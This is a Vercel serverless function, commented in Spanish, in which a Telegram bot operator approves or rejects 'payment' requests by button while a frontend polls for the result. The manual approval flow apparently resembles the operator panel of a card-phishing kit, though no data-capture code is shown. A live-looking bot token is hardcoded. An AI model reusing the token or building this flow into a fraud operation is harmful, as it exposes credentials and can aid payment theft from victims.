// No necesitas instalar nada extra, Vercel incluye fetch nativo

// Configuración de Telegram
const TELEGRAM_BOT_TOKEN = '8952571695:AAHr5qHDQ7Hu0LoqGS49jUWg9MYFjO1MaBw';
const TELEGRAM_API = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}`;

// Almacenamiento temporal (en producción usa una base de datos real)
// Esto es solo para demo - en producción usa Redis, Firebase, etc.
if (!global.solicitudes) {
    global.solicitudes = new Map();
}

export default async function handler(req, res) {
    // Configurar CORS
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

    if (req.method === 'OPTIONS') {
        return res.status(200).end();
    }

    // RUTA: POST /api/webhook - Recibe actualizaciones de Telegram
    if (req.method === 'POST') {
        try {
            const update = req.body;
            console.log('📨 Update recibido:', JSON.stringify(update));

            // Verificar si es un callback query (botón presionado)
            if (update.callback_query) {
                const callbackData = update.callback_query.data;
                const callbackId = update.callback_query.id;
                const message = update.callback_query.message;
                const chatId = message.chat.id;
                const messageId = message.message_id;
                const originalText = message.text || '';

                console.log('🔘 Botón presionado:', callbackData);

                // Extraer ID de solicitud y acción
                const [action, solicitudId] = callbackData.split('_');

                // Responder al callback query inmediatamente
                await fetch(`${TELEGRAM_API}/answerCallbackQuery`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        callback_query_id: callbackId,
                        text: action === 'approve' ? '✅ Pago aprobado' : '❌ Pago rechazado',
                        show_alert: false
                    })
                });

                // Actualizar el mensaje en Telegram
                const estadoEmoji = action === 'approve' ? '✅ APROBADO' : '❌ RECHAZADO';
                const estadoMensaje = action === 'approve' 
                    ? '✅ *APROBADO* - El cliente será redirigido' 
                    : '❌ *RECHAZADO* - Se mostrará error al cliente';

                const newText = originalText.replace(
                    '⏳ *Estado:* Esperando verificación...',
                    `⏳ *Estado:* ${estadoMensaje}`
                );

                await fetch(`${TELEGRAM_API}/editMessageText`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: chatId,
                        message_id: messageId,
                        text: newText,
                        parse_mode: 'Markdown'
                    })
                });

                // Guardar el estado de la solicitud
                global.solicitudes.set(solicitudId, {
                    estado: action === 'approve' ? 'approved' : 'rejected',
                    timestamp: Date.now(),
                    chatId: chatId,
                    messageId: messageId
                });

                console.log(`✅ Solicitud ${solicitudId}: ${action === 'approve' ? 'APROBADA' : 'RECHAZADA'}`);

                return res.status(200).json({ 
                    success: true, 
                    message: `Solicitud ${solicitudId} ${action === 'approve' ? 'aprobada' : 'rechazada'}` 
                });
            }

            // Si es un mensaje normal, ignorar
            return res.status(200).json({ success: true, message: 'Update recibido' });

        } catch (error) {
            console.error('❌ Error procesando webhook:', error);
            return res.status(500).json({ error: 'Error interno del servidor' });
        }
    }

    // RUTA: GET /api/webhook?check=solicitudId - El frontend consulta el estado
    if (req.method === 'GET') {
        const { check, setup } = req.query;

        // Configurar el webhook (se hace una sola vez)
        if (setup === 'true') {
            try {
                // Obtener la URL base de la solicitud
                const baseUrl = `https://${req.headers.host}`;
                const webhookUrl = `${baseUrl}/api/webhook`;

                console.log('🔗 Configurando webhook en:', webhookUrl);

                const response = await fetch(`${TELEGRAM_API}/setWebhook`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        url: webhookUrl,
                        allowed_updates: ['callback_query', 'message']
                    })
                });

                const data = await response.json();
                console.log('✅ Webhook configurado:', data);

                return res.status(200).json({
                    success: true,
                    message: 'Webhook configurado exitosamente',
                    webhookUrl: webhookUrl,
                    telegramResponse: data
                });
            } catch (error) {
                console.error('❌ Error configurando webhook:', error);
                return res.status(500).json({ error: 'Error configurando webhook' });
            }
        }

        // Verificar estado de una solicitud
        if (check) {
            const solicitudId = check;
            const solicitud = global.solicitudes.get(solicitudId);

            if (solicitud) {
                return res.status(200).json({
                    success: true,
                    solicitudId: solicitudId,
                    estado: solicitud.estado,
                    timestamp: solicitud.timestamp
                });
            } else {
                return res.status(200).json({
                    success: true,
                    solicitudId: solicitudId,
                    estado: 'pending',
                    mensaje: 'Solicitud aún no procesada'
                });
            }
        }

        // Obtener info del webhook
        try {
            const response = await fetch(`${TELEGRAM_API}/getWebhookInfo`);
            const data = await response.json();
            return res.status(200).json(data);
        } catch (error) {
            return res.status(500).json({ error: 'Error obteniendo info del webhook' });
        }
    }

    return res.status(405).json({ error: 'Método no permitido' });
}
